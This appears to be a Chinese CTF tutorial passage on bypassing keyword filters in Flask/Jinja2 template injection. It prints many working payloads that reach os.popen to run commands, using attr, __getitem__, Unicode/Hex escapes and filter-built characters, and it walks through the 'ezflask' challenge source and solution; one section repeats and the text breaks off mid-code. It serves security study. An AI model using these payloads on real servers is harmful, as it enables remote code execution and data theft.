<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="同时过滤了-、点-和"><a href="#同时过滤了-、点-和" class="headerlink" title="同时过滤了 __ 、点. 和 []"></a>同时过滤了 __ 、点. 和 []</h3><p>过滤了以下字符：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__    .    [    &quot;</span><br></pre></td></tr></table></figure>

<p>下面我们演示绕过姿势，先写出payload的原型：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>由于中括号 <code>[</code> 被过滤了，我们可以用 <code>__getitem__()</code> 来绕过（尽量不要用pop()），类似如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(77).__init__.__globals__.__getitem__(&#x27;__builtins__&#x27;).__getitem__(&#x27;eval&#x27;)(&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>由于还过滤了下划线 <code>__</code>，我们可以用request对象绕过，但是还过滤了中括号 <code>[]</code>，所以我们要同时绕过 <code>__</code> 和 <code>[</code>，就用到了我们的<code>|attr()</code></p>
<p>所以最终的payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(77)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)&#125;&#125;&amp;x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(&quot;os&quot;).popen(&#x27;ls /&#x27;).read()</span><br></pre></td></tr></table></figure>

<h3 id="同时过滤了-、点-和-1"><a href="#同时过滤了-、点-和-1" class="headerlink" title="同时过滤了 __ 、点. 和 []"></a>同时过滤了 __ 、点. 和 []</h3><p>过滤了以下字符：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__    .    [    &quot;</span><br></pre></td></tr></table></figure>

<p>下面我们演示绕过姿势，先写出payload的原型：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>由于中括号 <code>[</code> 被过滤了，我们可以用 <code>__getitem__()</code> 来绕过（尽量不要用pop()），类似如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(77).__init__.__globals__.__getitem__(&#x27;__builtins__&#x27;).__getitem__(&#x27;eval&#x27;)(&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>由于还过滤了下划线 <code>__</code>，我们可以用request对象绕过，但是还过滤了中括号 <code>[]</code>，所以我们要同时绕过 <code>__</code> 和 <code>[</code>，就用到了我们的<code>|attr()</code></p>
<p>所以最终的payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(77)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)&#125;&#125;&amp;x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(&quot;os&quot;).popen(&#x27;ls /&#x27;).read()</span><br></pre></td></tr></table></figure>

<h3 id="用Unicode编码配合-attr-进行Bypass"><a href="#用Unicode编码配合-attr-进行Bypass" class="headerlink" title="用Unicode编码配合 |attr() 进行Bypass"></a>用Unicode编码配合 <code>|attr()</code> 进行Bypass</h3><p>过滤了以下字符：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;  request  &#123;&#123;  _  %20(空格)  [  ]  .  __globals__   __getitem__</span><br></pre></td></tr></table></figure>

<p>我们用 <code>&#123;%print(......)%&#125;</code>绕过对 <code>&#123;&#123;` 的过滤，并用unicode绕过对关键字的过滤。unicode绕过是一种网上没提出的方法。

假设我们要构造的payload原型为：

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

先用 `|attr` 绕过 `.` 和 `[]`：

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(77)|attr(&quot;__init__&quot;)|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;ls&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>

我们可以将过滤掉的字符用unicode替换掉：

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;)()|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(77)|attr(&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;ls&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>

### 用Hex编码配合 `|attr()` 进行Bypass

和上面那个一样，只不过是将Unicode编码换成了Hex编码，适用于“u”被过滤了的情况。

我们可以将过滤掉的字符用Hex编码替换掉：

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x62\x61\x73\x65\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f&quot;)()|attr(&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;)(258)|attr(&quot;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat\x20\x66\x6c\x61\x67\x2e\x74\x78\x74&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>

## 使用 JinJa 的过滤器进行Bypass

在 Flask JinJa 中，内只有很多过滤器可以使用，前文的attr()就是其中的一个过滤器。变量可以通过过滤器进行修改，过滤器与变量之间用管道符号（|）隔开，括号中可以有可选参数，也可以没有参数，过滤器函数可以带括号也可以不带括号。可以使用管道符号（|）连接多个过滤器，一个过滤器的输出应用于下一个过滤器。

详情请看官方文档：https://jinja.palletsprojects.com/en/master/templates/#builtin-filters

以下是内置的所有的过滤器列表：

| [`abs()`](https://jinja.palletsprojects.com/en/master/templates/#abs) | [`float()`](https://jinja.palletsprojects.com/en/master/templates/#float) | [`lower()`](https://jinja.palletsprojects.com/en/master/templates/#lower) | [`round()`](https://jinja.palletsprojects.com/en/master/templates/#round) | [`tojson()`](https://jinja.palletsprojects.com/en/master/templates/#tojson) |
| ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |
| [`attr()`](https://jinja.palletsprojects.com/en/master/templates/#attr) | [`forceescape()`](https://jinja.palletsprojects.com/en/master/templates/#forceescape) | [`map()`](https://jinja.palletsprojects.com/en/master/templates/#map) | [`safe()`](https://jinja.palletsprojects.com/en/master/templates/#safe) | [`trim()`](https://jinja.palletsprojects.com/en/master/templates/#trim) |
| [`batch()`](https://jinja.palletsprojects.com/en/master/templates/#batch) | [`format()`](https://jinja.palletsprojects.com/en/master/templates/#format) | [`max()`](https://jinja.palletsprojects.com/en/master/templates/#max) | [`select()`](https://jinja.palletsprojects.com/en/master/templates/#select) | [`truncate()`](https://jinja.palletsprojects.com/en/master/templates/#truncate) |
| [`capitalize()`](https://jinja.palletsprojects.com/en/master/templates/#capitalize) | [`groupby()`](https://jinja.palletsprojects.com/en/master/templates/#groupby) | [`min()`](https://jinja.palletsprojects.com/en/master/templates/#min) | [`selectattr()`](https://jinja.palletsprojects.com/en/master/templates/#selectattr) | [`unique()`](https://jinja.palletsprojects.com/en/master/templates/#unique) |
| [`center()`](https://jinja.palletsprojects.com/en/master/templates/#center) | [`indent()`](https://jinja.palletsprojects.com/en/master/templates/#indent) | [`pprint()`](https://jinja.palletsprojects.com/en/master/templates/#pprint) | [`slice()`](https://jinja.palletsprojects.com/en/master/templates/#slice) | [`upper()`](https://jinja.palletsprojects.com/en/master/templates/#upper) |
| [`default()`](https://jinja.palletsprojects.com/en/master/templates/#default) | [`int()`](https://jinja.palletsprojects.com/en/master/templates/#int) | [`random()`](https://jinja.palletsprojects.com/en/master/templates/#random) | [`sort()`](https://jinja.palletsprojects.com/en/master/templates/#sort) | [`urlencode()`](https://jinja.palletsprojects.com/en/master/templates/#urlencode) |
| [`dictsort()`](https://jinja.palletsprojects.com/en/master/templates/#dictsort) | [`join()`](https://jinja.palletsprojects.com/en/master/templates/#join) | [`reject()`](https://jinja.palletsprojects.com/en/master/templates/#reject) | [`string()`](https://jinja.palletsprojects.com/en/master/templates/#string) | [`urlize()`](https://jinja.palletsprojects.com/en/master/templates/#urlize) |
| [`escape()`](https://jinja.palletsprojects.com/en/master/templates/#escape) | [`last()`](https://jinja.palletsprojects.com/en/master/templates/#last) | [`rejectattr()`](https://jinja.palletsprojects.com/en/master/templates/#rejectattr) | [`striptags()`](https://jinja.palletsprojects.com/en/master/templates/#striptags) | [`wordcount()`](https://jinja.palletsprojects.com/en/master/templates/#wordcount) |
| [`filesizeformat()`](https://jinja.palletsprojects.com/en/master/templates/#filesizeformat) | [`length()`](https://jinja.palletsprojects.com/en/master/templates/#length) | [`replace()`](https://jinja.palletsprojects.com/en/master/templates/#replace) | [`sum()`](https://jinja.palletsprojects.com/en/master/templates/#sum) | [`wordwrap()`](https://jinja.palletsprojects.com/en/master/templates/#wordwrap) |
| [`first()`](https://jinja.palletsprojects.com/en/master/templates/#first) | [`list()`](https://jinja.palletsprojects.com/en/master/templates/#list) | [`reverse()`](https://jinja.palletsprojects.com/en/master/templates/#reverse) | [`title()`](https://jinja.palletsprojects.com/en/master/templates/#title) | [`xmlattr()`](https://jinja.palletsprojects.com/en/master/templates/#xmlattr) |

可以自行点击每个过滤器去查看每一种过滤器的作用。我们就是利用这些过滤器，一步步的拼接出我们想要的字符、数字或字符串。

### 常用字符获取入口点

- 对于获取一般字符的方法有以下几种：

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set org = (&#123; &#125;|select()|string()) %&#125;&#123;&#123;org&#125;&#125;</span><br><span class="line">&#123;% set org = (self|string()) %&#125;&#123;&#123;org&#125;&#125;</span><br><span class="line">&#123;% set org = self|string|urlencode %&#125;&#123;&#123;org&#125;&#125;</span><br><span class="line">&#123;% set org = (app.__doc__|string) %&#125;&#123;&#123;org&#125;&#125;</span><br></pre></td></tr></table></figure>

如下演示：

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set org = (&#123; &#125;|select()|string()) %&#125;&#123;&#123;org&#125;&#125;</span><br></pre></td></tr></table></figure>

可以通过上面获取到的 `<generator object select_or_reject at 0x7fe339298fc0>` 字符串获取的字符有：尖号、字母、空格、下划线和数字。

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set org = (self|string()) %&#125;&#123;&#123;org&#125;&#125;</span><br></pre></td></tr></table></figure>

如上图所示，可以通过 `<TemplateReference None>` 字符串获取的字符有：尖号、字母和空格。

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set org = self|string|urlencode %&#125;&#123;&#123;org&#125;&#125;</span><br></pre></td></tr></table></figure>

可以通过上面获取到的除了字母以外还有百分号，这一点比较重要，因为如果我们控制了百分号的话我们可以获取任意字符

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set org = (app.__doc__|string) %&#125;&#123;&#123;org&#125;&#125;</span><br></pre></td></tr></table></figure>

可获得到的字符更多了。

- 对于获取数字，除了上面出现的那几种外我们还可以有以下几种方法：

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set num = (self|int) %&#125;&#123;&#123;num&#125;&#125;    # 0, 通过int过滤器获取数字</span><br><span class="line">&#123;% set num = (self|string|length) %&#125;&#123;&#123;num&#125;&#125;    # 24, 通过length过滤器获取数字</span><br><span class="line">&#123;% set point = self|float|string|min %&#125;    # 通过float过滤器获取点 .</span><br><span class="line">&#123;% set num = (True|int) %&#125;         #得到1</span><br></pre></td></tr></table></figure>

比如：`code=&#123;% set a='aaaaaaaaaaa'|length*'aa'|length*'aaaaaaa'|length %&#125;&#123;&#123;a&#125;&#125;</code>得到154</p>
<p>有了数字0之后，我们便可以依次将其余的数字全部构造出来，原理就是加减乘除、平方等数学运算。</p>
<h3 id="2020-DASCTF-八月安恒月赛-ezflask"><a href="#2020-DASCTF-八月安恒月赛-ezflask" class="headerlink" title="[2020 DASCTF 八月安恒月赛]ezflask"></a>[2020 DASCTF 八月安恒月赛]ezflask</h3><p>题目源码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, render_template_string, redirect, request, session, abort, send_from_directory</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">safe_jinja</span>(<span class="params">s</span>):</span><br><span class="line">        blacklist = [<span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;attr&#x27;</span>, <span class="string">&#x27;mro&#x27;</span>, <span class="string">&#x27;base&#x27;</span>,</span><br><span class="line">                     <span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;session&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;add&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;ord&#x27;</span>, <span class="string">&#x27;redirect&#x27;</span>, <span class="string">&#x27;url_for&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;get_flashed_messages&#x27;</span>, <span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;subclasses&#x27;</span>, <span class="string">&#x27;form&#x27;</span>, <span class="string">&#x27;cookies&#x27;</span>, <span class="string">&#x27;headers&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;&#123;&#125;&#x27;</span>]</span><br><span class="line">        flag = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">            <span class="keyword">if</span> no.lower() <span class="keyword">in</span> s.lower():</span><br><span class="line">                flag = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> flag</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> request.args.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line">    <span class="keyword">elif</span> safe_jinja(request.args.get(<span class="string">&#x27;name&#x27;</span>)):</span><br><span class="line">        name = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        name = <span class="string">&#x27;wendell&#x27;</span></span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;div class=&quot;center-content&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;Hello, %s&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;!--flag in /flag--&gt;</span></span><br><span class="line"><span class="string">    &lt;!--python3.8--&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> % (name)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p>可以看到题目过滤的死死地，最关键是把attr也给过滤了的话，这就很麻烦了，但是我们还可以用过滤器进行绕过。</p>
<p>在存在ssti的地方执行如下payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set org = (&#123; &#125;|select()|string()) %&#125;&#123;&#123;org&#125;&#125;</span><br><span class="line"># 或 &#123;% set org = (&#123; &#125;|select|string) %&#125;&#123;&#123;org&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../imgs/$%7Bfiilname%7D/image-20240311204031805.png" alt="image-20240311204031805"></p>
<p>可以看到，我们得到了一段字符串：<code>&lt;generator object select_or_reject at 0x7f06771f4150&gt;</code>，这段字符串中不仅存在字符，还存在空格、下划线，尖号和数字。也就是说，如果题目过滤了这些字符的话，我们便可以在 <code>&lt;generator object select_or_reject at 0x7f06771f4150&gt;</code> 这个字符串中取到我们想要的字符，从而绕过过滤。</p>
<p>然后我们在使用list()过滤器将字符串转化为列表：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set orglst = (&#123; &#125;|select|string|list) %&#125;&#123;&#123;orglst&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../imgs/$%7Bfiilname%7D/image-20240311204059807.png" alt="image-20240311204059807"></p>
<p>如上图所示，反回了一个列表，列表中是 <code>&lt;generator object select_or_reject at 0x7f06771f4150&gt;</code> 这个字符串的每一个字符。接下来我们便可以使用使用pop()等方法将列表里的字符取出来了。如下所示，我们取一个下划线 <code>_</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set xhx = ((&#123; &#125;|select|string|list).pop(24)|string) %&#125;&#123;&#123;xhx&#125;&#125;    # _</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../imgs/$%7Bfiilname%7D/image-20240311204122264.png" alt="image-20240311204122264"></p>
<p>同理还能取到更多的字符：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set space = ((&#123; &#125;|select|string|list).pop(10)|string) %&#125;&#123;&#123;spa&#125;&#125;    # 空格</span><br><span class="line">&#123;% set xhx = ((&#123; &#125;|select|string|list).pop(24)|string) %&#125;&#123;&#123;xhx&#125;&#125;    # _</span><br><span class="line">&#123;% set zero = ((&#123; &#125;|select|string|list).pop(38)|int) %&#125;&#123;&#123;zero&#125;&#125;    # 0</span><br><span class="line">&#123;% set seven = ((&#123; &#125;|select|string|list).pop(40)|int) %&#125;&#123;&#123;seven&#125;&#125;    # 7</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>这里，其实有了数字0之后，我们便可以依次将其余的数字全部构造出来，原理就是加减乘除、平方等数学运算，如下示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set zero = ((&#123; &#125;|select|string|list).pop(38)|int) %&#125;    # 0</span><br><span class="line">&#123;% set one = (zero**zero)|int %&#125;&#123;&#123;one&#125;&#125;    # 1</span><br><span class="line">&#123;%set two = (zero-one-one)|abs %&#125;    # 2</span><br><span class="line">&#123;%set three = (zero-one-one-one)|abs %&#125;    # 3</span><br><span class="line">&#123;% set five = (two*two*two)-one-one-one %&#125;    # 5</span><br><span class="line">#  &#123;%set four = (one+three) %&#125;    注意, 这样的加号的是不行的,不知道为什么,只能用减号配合abs取绝对值了</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../imgs/$%7Bfiilname%7D/image-20240311204344088.png" alt="image-20240311204344088"></p>
<p>通过上述原理，我们可以依次获得构造payload所需的特殊字符与字符串：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首先构造出所需的数字:</span></span><br><span class="line">&#123;% <span class="built_in">set</span> zero = ((&#123; &#125;|select|string|<span class="built_in">list</span>).pop(<span class="number">38</span>)|<span class="built_in">int</span>) %&#125;    <span class="comment"># 0</span></span><br><span class="line">&#123;% <span class="built_in">set</span> one = (zero**zero)|<span class="built_in">int</span> %&#125;    <span class="comment"># 1</span></span><br><span class="line">&#123;% <span class="built_in">set</span> two = (zero-one-one)|<span class="built_in">abs</span> %&#125;    <span class="comment"># 2</span></span><br><span class="line">&#123;% <span class="built_in">set</span> four = (two*two)|<span class="built_in">int</span> %&#125;    <span class="comment"># 4</span></span><br><span class="line">&#123;% <span class="built_in">set</span> five = (two*two*two)-one-one-one %&#125;    <span class="comment"># 5</span></span><br><span class="line">&#123;% <span class="built_in">set</span> seven = (zero-one-one-five)|<span class="built_in">abs</span> %&#125;    <span class="comment"># 7</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造出所需的各种字符与字符串:</span></span><br><span class="line">&#123;% <span class="built_in">set</span> xhx = ((&#123; &#125;|select|string|<span class="built_in">list</span>).pop(<span class="number">24</span>)|string) %&#125;    <span class="comment"># _</span></span><br><span class="line">&#123;% <span class="built_in">set</span> space = ((&#123; &#125;|select|string|<span class="built_in">list</span>).pop(<span class="number">10</span>)|string) %&#125;    <span class="comment"># 空格</span></span><br><span class="line">&#123;% <span class="built_in">set</span> point = ((app.__doc__|string|<span class="built_in">list</span>).pop(<span class="number">26</span>)|string) %&#125;    <span class="comment"># .</span></span><br><span class="line">&#123;% <span class="built_in">set</span> yin = ((app.__doc__|string|<span class="built_in">list</span>).pop(<span class="number">195</span>)|string) %&#125;    <span class="comment"># 单引号 &#x27;</span></span><br><span class="line">&#123;% <span class="built_in">set</span> left = ((app.__doc__|string|<span class="built_in">list</span>).pop(<span class="number">189</span>)|string) %&#125;    <span class="comment"># 左括号 (</span></span><br><span class="line">&#123;% <span class="built_in">set</span> right = ((app.__doc__|string|<span class="built_in">list</span>).pop(<span class="number">200</span>)|string) %&#125;    <span class="comment"># 右括号 )</span></span><br><span class="line"></span><br><span class="line">&#123;% <span class="built_in">set</span> c = <span class="built_in">dict</span>(c=aa)|reverse|first %&#125;    <span class="comment"># 字符 c</span></span><br><span class="line">&#123;% <span class="built_in">set</span> bfh = self|string|urlencode|first %&#125;    <span class="comment"># 百分号 %</span></span><br><span class="line">&#123;% <span class="built_in">set</span> bfhc=bfh~c %&#125;    <span class="comment"># 这里构造了%c, 之后可以利用这个%c构造任意字符。~用于字符连接</span></span><br><span class="line">&#123;% <span class="built_in">set</span> slas = bfhc%((four~seven)|<span class="built_in">int</span>) %&#125;    <span class="comment"># 使用%c构造斜杠 /，使用某种格式化操作（%c），这在很多编程语言中用于将一个整数转换为其对应的字符。在ASCII码表中，整数 47 对应的字符是斜杠（/）</span></span><br><span class="line">&#123;% <span class="built_in">set</span> but = <span class="built_in">dict</span>(buil=aa,tins=dd)|join %&#125;    <span class="comment"># builtins</span></span><br><span class="line">&#123;% <span class="built_in">set</span> imp = <span class="built_in">dict</span>(imp=aa,ort=dd)|join %&#125;    <span class="comment"># import</span></span><br><span class="line">&#123;% <span class="built_in">set</span> pon = <span class="built_in">dict</span>(po=aa,pen=dd)|join %&#125;    <span class="comment"># popen</span></span><br><span class="line">&#123;% <span class="built_in">set</span> os = <span class="built_in">dict</span>(o=aa,s=dd)|join %&#125;    <span class="comment"># os</span></span><br><span class="line">&#123;% <span class="built_in">set</span> ca = <span 